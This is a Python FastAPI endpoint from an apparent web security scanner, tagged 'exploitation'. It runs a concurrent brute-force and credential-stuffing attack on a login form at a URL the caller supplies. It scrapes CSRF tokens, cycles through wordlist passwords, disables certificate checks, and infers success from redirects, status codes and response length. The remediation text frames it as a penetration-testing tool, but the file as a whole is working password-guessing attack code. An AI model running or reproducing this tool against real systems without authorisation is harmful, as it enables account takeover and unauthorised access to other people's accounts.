from __future__ import annotations
import asyncio
import re
import time
import httpx
from fastapi import APIRouter
from models import BruteReq
from tools.utils import clean_url, f, ok, err, load_wordlist, HEADERS

router = APIRouter(tags=["exploitation"])

FAIL_TOKENS = [
    "invalid", "incorrect", "failed", "error", "wrong", "denied",
    "unauthorized", "bad credentials", "try again", "not match"
]

CSRF_FIELD_PATTERNS = [
    r'name=["\'](csrf[_-]?token|_token|authenticity_token|csrfmiddlewaretoken|anticsrf)["\']\s+value=["\']([^"\']+)["\']',
    r'value=["\']([^"\']+)["\']\s+name=["\'](csrf[_-]?token|_token|authenticity_token|csrfmiddlewaretoken|anticsrf)["\']',
]


async def extract_csrf_and_cookies(client: httpx.AsyncClient, url: str) -> tuple[dict, dict]:
    """Extracts CSRF tokens and cookies from the initial login page GET request."""
    hidden_fields = {}
    try:
        r = await client.get(url, headers=HEADERS, timeout=8)
        text = r.text
        for pat in CSRF_FIELD_PATTERNS:
            for match in re.finditer(pat, text, re.I):
                groups = match.groups()
                if len(groups) == 2:
                    g0_low = groups[0].lower()
                    if 'token' in g0_low or 'csrf' in g0_low:
                        name, val = groups[0], groups[1]
                    else:
                        name, val = groups[1], groups[0]
                    hidden_fields[name] = val
    except Exception:
        pass
    return hidden_fields, dict(client.cookies)


@router.post("/bruteforce")
async def brute_force(req: BruteReq):
    t_start = time.time()
    url = clean_url(req.target)
    uf = req.username_field.strip() or "username"
    pf = req.password_field.strip() or "password"
    concurrency = max(1, min(req.concurrency or 5, 20))
    is_json = (req.payload_type or "form").lower() == "json"

    # Build list of (username, password) tuples
    cred_pairs = []
    if req.credentials and req.credentials.strip():
        for line in req.credentials.strip().split("\n"):
            line = line.strip()
            if ":" in line:
                u, p = line.split(":", 1)
                cred_pairs.append((u.strip(), p.strip()))

    if not cred_pairs:
        raw_pwds = []
        if req.passwords and req.passwords.strip():
            raw_pwds = [p.strip() for p in req.passwords.strip().split("\n") if p.strip()]
        else:
            full_list = load_wordlist("passwords.txt")
            w_size = (req.wordlist_size or "medium").lower()
            if w_size == "small":
                raw_pwds = full_list[:50]
            elif w_size == "large":
                raw_pwds = full_list[:1000]
            else:
                raw_pwds = full_list[:250]

        if not raw_pwds:
            raw_pwds = ["password", "123456", "admin", "admin123", "letmein", "welcome", "pass123", "root"]

        def_user = req.username.strip() or "admin"
        for item in raw_pwds:
            if ":" in item:
                u, p = item.split(":", 1)
                cred_pairs.append((u.strip(), p.strip()))
            else:
                cred_pairs.append((def_user, item))

    findings = []
    records = []
    found_credentials = []
    rate_limited = False
    stop_event = asyncio.Event()

    async with httpx.AsyncClient(verify=False, follow_redirects=False, timeout=10) as client:
        # Step 1: Detect CSRF & baseline
        csrf_fields, session_cookies = await extract_csrf_and_cookies(client, url)

        # Baseline request with dummy impossible password
        base_len = 0
        base_code = 200
        first_user = cred_pairs[0][0] if cred_pairs else "admin"
        try:
            baseline_payload = {uf: first_user, pf: "IMPOSSIBLE_BASELINE_XY_9999_DUMMY", **csrf_fields}
            if is_json:
                base_r = await client.post(url, json=baseline_payload, headers=HEADERS)
            else:
                base_r = await client.post(url, data=baseline_payload, headers=HEADERS)
            base_len = len(base_r.text)
            base_code = base_r.status_code
        except Exception as e:
            return err(f"Unable to reach login target: {str(e)}")

        # Step 2: Concurrent worker pool
        semaphore = asyncio.Semaphore(concurrency)
        lock = asyncio.Lock()

        async def test_single_credential(user: str, password: str):
            nonlocal rate_limited
            if stop_event.is_set():
                return

            async with semaphore:
                if stop_event.is_set():
                    return

                payload = {uf: user, pf: password, **csrf_fields}
                try:
                    if is_json:
                        r = await client.post(url, json=payload, headers=HEADERS)
                    else:
                        r = await client.post(url, data=payload, headers=HEADERS)

                    code = r.status_code
                    body_l = r.text.lower()
                    loc = r.headers.get("location", "").lower()

                    if code == 429:
                        rate_limited = True
                        stop_event.set()
                        async with lock:
                            records.append({
                                "Username": user,
                                "Password": password,
                                "Status": code,
                                "Result": "Rate Limited (429)"
                            })
                        return

                    success = False
                    # Check 1: User explicitly supplied success indicator
                    if req.success_indicator and req.success_indicator.lower() in body_l:
                        success = True
                    # Check 2: Redirect towards dashboard/welcome or out of login
                    elif code in (301, 302, 303, 307):
                        if loc and not any(k in loc for k in ["login", "signin", "auth", "error", "fail"]):
                            success = True
                    # Check 3: Status code changed from baseline failure
                    elif base_code in (401, 403) and code == 200:
                        has_fail = any(t in body_l for t in FAIL_TOKENS)
                        if not has_fail:
                            success = True
                    # Check 4: Significant body length variance without failure tokens
                    elif abs(len(r.text) - base_len) > 400:
                        has_fail = any(t in body_l for t in FAIL_TOKENS)
                        if not has_fail:
                            success = True

                    async with lock:
                        records.append({
                            "Username": user,
                            "Password": password,
                            "Status": code,
                            "Result": "✓ SUCCESS" if success else "Failed",
                        })

                        if success:
                            found_credentials.append((user, password))
                            if not req.credentials:
                                # In single-target brute-force, stop on first cracked password
                                stop_event.set()

                except Exception as ex:
                    async with lock:
                        records.append({
                            "Username": user,
                            "Password": password,
                            "Status": 0,
                            "Result": f"Error ({str(ex)[:30]})",
                        })

        tasks = [test_single_credential(u, p) for u, p in cred_pairs]
        await asyncio.gather(*tasks)

    elapsed = round(time.time() - t_start, 2)
    tested_count = len(records)

    # Compile findings
    if found_credentials:
        for u, p in found_credentials:
            findings.append(f(
                "critical",
                f"Credentials Found: {u}:{p}",
                f"Successful authentication for '{u}' at {url}.",
                "Enforce immediate password change, account lockout policy, CAPTCHA, and Multi-Factor Authentication (MFA)."
            ))
    else:
        findings.append(f(
            "pass",
            "No Credentials Found",
            f"Tested {tested_count} credential combinations without successful login."
        ))

    if rate_limited:
        findings.append(f(
            "pass",
            "Rate Limiting Active (HTTP 429)",
            f"Server enforced rate limiting after {tested_count} attempts."
        ))
    elif tested_count >= 10:
        findings.append(f(
            "high",
            "No Account Lockout Detected",
            f"Server allowed {tested_count} rapid consecutive failed logins without account lockout or rate limit.",
            "Implement progressive lockout delay after 5 failed attempts."
        ))

    if csrf_fields:
        findings.append(f(
            "pass",
            "CSRF Protection Detected",
            f"Login form contains anti-CSRF token: {list(csrf_fields.keys())}"
        ))

    return ok({
        "summary": {
            "Login URL": url,
            "Target User": req.username if not req.credentials else "Multiple (Stuffing)",
            "Combinations Tested": f"{tested_count} / {len(cred_pairs)}",
            "Credentials Found": f"YES ({len(found_credentials)} accounts)" if found_credentials else "No",
            "Concurrency": f"{concurrency} parallel workers",
            "Payload Format": "JSON" if is_json else "Form-URLEncoded",
            "CSRF Detected": "YES" if csrf_fields else "No",
            "Elapsed Time": f"{elapsed}s",
        },
        "findings": findings,
        "records": records[:50],
        "record_columns": ["Username", "Password", "Status", "Result"],
    })
